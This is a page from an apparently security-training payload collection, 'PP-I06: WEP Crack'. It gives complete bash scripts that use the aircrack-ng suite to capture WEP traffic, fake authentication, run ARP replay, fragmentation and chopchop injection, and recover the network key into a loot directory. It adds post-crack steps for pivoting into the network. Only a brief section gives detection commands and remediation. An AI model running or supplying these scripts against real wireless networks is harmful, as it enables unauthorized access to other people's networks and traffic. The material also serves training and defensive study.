# PP-I06: WEP Crack

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I06 |
| **Name** | WEP Crack |
| **Difficulty** | Intermediate |
| **Type** | Attack |
| **Purpose** | Crack WEP encryption |
| **MITRE ATT&CK** | T1040 (Network Sniffing), T1110 (Brute Force) |

## What This Payload Does

Captures WEP-encrypted traffic and cracks the encryption key. WEP (Wired Equivalent Privacy) has fundamental design flaws that make it trivially crackable with enough captured packets.

---

## Understanding WEP Weakness

```
┌─────────────────────────────────────────────────────────────┐
│                    WHY WEP IS BROKEN                        │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│   WEP ENCRYPTION:                                           │
│   ──────────────                                            │
│   Key: Static 40-bit or 104-bit                             │
│   IV:  24-bit (only 16 million combinations)                │
│   RC4: Stream cipher with weak key scheduling               │
│                                                              │
│   THE FLAW:                                                 │
│   • IV is transmitted in plaintext                          │
│   • After ~5000 packets, IVs repeat                         │
│   • Related-key attacks reveal key bytes                    │
│   • No integrity protection                                  │
│                                                              │
│   ATTACK PROGRESSION:                                       │
│   ─────────────────                                         │
│   0 IVs       → Cannot crack                                │
│   10,000 IVs  → Possible (PTW attack)                       │
│   50,000 IVs  → Likely                                      │
│   100,000 IVs → Almost certain                              │
│                                                              │
│   SPEED UP WITH:                                            │
│   • ARP replay (generate traffic)                           │
│   • Fragmentation attack                                    │
│   • Chopchop attack                                         │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I06
# Name: WEP Crack
# Description: Automated WEP network cracking
# Author: Security Training
#

# ============================================
# CONFIGURATION
# ============================================
INTERFACE="wlan1"
TARGET_BSSID=""
TARGET_CHANNEL=""
TARGET_ESSID=""
OUTPUT_DIR="/sd/loot/wep"
MIN_IVS=20000

# ============================================
# SETUP
# ============================================
LOG_FILE="/tmp/pp-i06.log"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
CAPTURE_PREFIX="$OUTPUT_DIR/wep_$TIMESTAMP"

log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

cleanup() {
    log "Cleaning up..."
    pkill -f airodump-ng 2>/dev/null
    pkill -f aireplay-ng 2>/dev/null
    airmon-ng stop "${INTERFACE}mon" 2>/dev/null
    exit 0
}

trap cleanup SIGINT SIGTERM

usage() {
    echo "Usage: $0 -b BSSID -c CHANNEL [-e ESSID]"
    echo ""
    echo "Options:"
    echo "  -b    Target BSSID (required)"
    echo "  -c    Target channel (required)"
    echo "  -e    Target ESSID (optional)"
    echo "  -i    Interface (default: wlan1)"
    exit 1
}

# ============================================
# PARSE ARGUMENTS
# ============================================
while getopts "b:c:e:i:h" opt; do
    case $opt in
        b) TARGET_BSSID="$OPTARG" ;;
        c) TARGET_CHANNEL="$OPTARG" ;;
        e) TARGET_ESSID="$OPTARG" ;;
        i) INTERFACE="$OPTARG" ;;
        h) usage ;;
        *) usage ;;
    esac
done

if [ -z "$TARGET_BSSID" ] || [ -z "$TARGET_CHANNEL" ]; then
    echo "ERROR: BSSID and channel are required"
    usage
fi

# ============================================
# INITIALIZATION
# ============================================
log "Starting PP-I06: WEP Crack"
log "Target: $TARGET_BSSID on channel $TARGET_CHANNEL"

mkdir -p "$OUTPUT_DIR"

# Check tools
for tool in airmon-ng airodump-ng aireplay-ng aircrack-ng; do
    command -v $tool >/dev/null 2>&1 || {
        log "ERROR: $tool not found"
        exit 1
    }
done

# ============================================
# ENABLE MONITOR MODE
# ============================================
log "Enabling monitor mode..."
airmon-ng check kill 2>/dev/null
airmon-ng start "$INTERFACE" 2>/dev/null

if ip link show "${INTERFACE}mon" >/dev/null 2>&1; then
    MON_INTERFACE="${INTERFACE}mon"
else
    MON_INTERFACE="${INTERFACE}"
fi

log "Monitor interface: $MON_INTERFACE"

# ============================================
# START CAPTURE
# ============================================
log "Starting packet capture..."
log "Looking for WEP IVs..."

airodump-ng \
    --bssid "$TARGET_BSSID" \
    --channel "$TARGET_CHANNEL" \
    --write "$CAPTURE_PREFIX" \
    --output-format pcap,csv \
    "$MON_INTERFACE" &

AIRODUMP_PID=$!
sleep 5

# ============================================
# FAKE AUTHENTICATION
# ============================================
log "Attempting fake authentication..."

# Get our MAC
OUR_MAC=$(cat /sys/class/net/$MON_INTERFACE/address 2>/dev/null || \
          macchanger -s $MON_INTERFACE | grep "Current" | awk '{print $3}')

aireplay-ng \
    --fakeauth 0 \
    -a "$TARGET_BSSID" \
    -h "$OUR_MAC" \
    "$MON_INTERFACE" &

FAKEAUTH_PID=$!
sleep 5

# Check if auth successful
if ps -p $FAKEAUTH_PID > /dev/null 2>&1; then
    log "Fake auth initiated"
else
    log "WARNING: Fake auth may have failed"
fi

# ============================================
# ARP REPLAY ATTACK
# ============================================
log "Starting ARP replay attack to generate IVs..."

aireplay-ng \
    --arpreplay \
    -b "$TARGET_BSSID" \
    -h "$OUR_MAC" \
    "$MON_INTERFACE" 2>&1 | tee -a "$LOG_FILE" &

ARP_PID=$!

echo ""
echo "╔════════════════════════════════════════════════════╗"
echo "║            WEP CRACK IN PROGRESS                   ║"
echo "╠════════════════════════════════════════════════════╣"
echo "║  Target:    $TARGET_BSSID"
echo "║  Channel:   $TARGET_CHANNEL"
echo "║  Interface: $MON_INTERFACE"
echo "║  Output:    $CAPTURE_PREFIX"
echo "║"
echo "║  Collecting IVs... (need ~$MIN_IVS)"
echo "╚════════════════════════════════════════════════════╝"
echo ""

# ============================================
# MONITOR IV COUNT AND CRACK
# ============================================
CRACK_STARTED=false

while true; do
    sleep 10

    CAP_FILE="${CAPTURE_PREFIX}-01.cap"

    if [ -f "$CAP_FILE" ]; then
        # Count IVs
        IV_COUNT=$(aircrack-ng "$CAP_FILE" 2>/dev/null | grep -oP '\d+(?= IVs)' | head -1)
        IV_COUNT=${IV_COUNT:-0}

        echo -ne "\rIVs captured: $IV_COUNT / $MIN_IVS"

        # Attempt crack when we have enough IVs
        if [ "$IV_COUNT" -ge "$MIN_IVS" ] && [ "$CRACK_STARTED" = false ]; then
            CRACK_STARTED=true
            log "Sufficient IVs collected. Starting crack attempt..."

            # Start aircrack in background
            aircrack-ng \
                -b "$TARGET_BSSID" \
                "$CAP_FILE" > "$OUTPUT_DIR/crack_attempt.log" 2>&1 &

            CRACK_PID=$!
        fi

        # Check if crack completed
        if [ "$CRACK_STARTED" = true ]; then
            if grep -q "KEY FOUND" "$OUTPUT_DIR/crack_attempt.log" 2>/dev/null; then
                echo ""
                echo ""
                echo "╔════════════════════════════════════════════════════╗"
                echo "║              KEY FOUND!                            ║"
                echo "╚════════════════════════════════════════════════════╝"
                echo ""
                grep "KEY FOUND" "$OUTPUT_DIR/crack_attempt.log"
                grep -A 5 "KEY FOUND" "$OUTPUT_DIR/crack_attempt.log" | tee "$OUTPUT_DIR/cracked_key.txt"
                echo ""
                log "Key saved to: $OUTPUT_DIR/cracked_key.txt"
                cleanup
            fi
        fi
    fi
done
```

---

## Attack Methods

### Method 1: ARP Replay (Most Common)
```bash
# Capture ARP request, replay it to generate IVs
aireplay-ng --arpreplay -b $BSSID -h $OUR_MAC wlan1mon
```

### Method 2: Interactive Packet Replay
```bash
# Select a packet to replay
aireplay-ng --interactive -b $BSSID -h $OUR_MAC wlan1mon
```

### Method 3: Fragmentation Attack
```bash
# When no ARP traffic available
aireplay-ng --fragment -b $BSSID -h $OUR_MAC wlan1mon
# Then use packetforge to create ARP:
packetforge-ng --arp -a $BSSID -h $OUR_MAC -l 255.255.255.255 -k 255.255.255.255 -y fragment.xor -w arp.cap
```

### Method 4: ChopChop Attack
```bash
# Alternative to fragmentation
aireplay-ng --chopchop -b $BSSID -h $OUR_MAC wlan1mon
```

---

## Cracking the Key

### PTW Attack (Fast)
```bash
# Default in aircrack-ng, needs ~20,000 IVs
aircrack-ng -b $BSSID capture-01.cap
```

### KoreK Attack (More IVs)
```bash
# Use when PTW fails
aircrack-ng -K -b $BSSID capture-01.cap
```

### With Dictionary (Unlikely for WEP)
```bash
aircrack-ng -w wordlist.txt -b $BSSID capture-01.cap
```

---

## Quick WEP Crack Script

```bash
#!/bin/bash
# One-liner WEP crack

BSSID="AA:BB:CC:DD:EE:FF"
CHANNEL="6"

# All-in-one
airmon-ng start wlan1 && \
airodump-ng -c $CHANNEL --bssid $BSSID -w /tmp/wep wlan1mon &
sleep 5 && \
MAC=$(cat /sys/class/net/wlan1mon/address) && \
aireplay-ng --fakeauth 0 -a $BSSID -h $MAC wlan1mon && \
aireplay-ng --arpreplay -b $BSSID -h $MAC wlan1mon &
sleep 300 && \  # Wait 5 minutes
aircrack-ng -b $BSSID /tmp/wep-01.cap
```

---

## Red Team Perspective

### Why Target WEP?
- Still exists in legacy environments
- IoT/industrial systems may use WEP
- Cracking takes minutes, not hours
- Full network access once cracked

### Post-Crack Actions
1. Connect to network
2. Enumerate internal hosts
3. Capture additional traffic
4. Pivot to other systems

---

## Blue Team Perspective

### Detection
```bash
# Detect injection attempts
tshark -i wlan0 -Y "wlan.fc.retry == 1" | grep -c "."
# High retry count = possible injection

# Monitor for unusual ARP traffic
tshark -i wlan0 -Y "arp" -c 1000 | sort | uniq -c | sort -rn
# Repeated ARP = replay attack
```

### Remediation
1. **Replace WEP immediately** - It cannot be secured
2. **Upgrade to WPA2/WPA3** - Minimum security
3. **Replace legacy devices** - If they only support WEP
4. **Network segmentation** - Isolate WEP devices if unavoidable

---

## Payload File

Save as `PP-I06_WEP_Crack.sh`:

```bash
#!/bin/bash
# PP-I06: WEP Crack (Compact)
BSSID="${1:?Usage: $0 BSSID CHANNEL}"
CH="${2:?Usage: $0 BSSID CHANNEL}"
airmon-ng start wlan1 && \
airodump-ng -c $CH --bssid $BSSID -w /tmp/wep wlan1mon &
sleep 5
MAC=$(cat /sys/class/net/wlan1mon/address)
aireplay-ng --fakeauth 0 -a $BSSID -h $MAC wlan1mon
aireplay-ng --arpreplay -b $BSSID -h $MAC wlan1mon &
echo "Collecting IVs... Run: aircrack-ng /tmp/wep-01.cap"
```

---

[← PP-I05 DNS Spoof](PP-I05_DNS_Spoof.md) | [Back to Intermediate](README.md) | [Next: PP-I07 WPA Handshake →](PP-I07_WPA_Handshake.md)
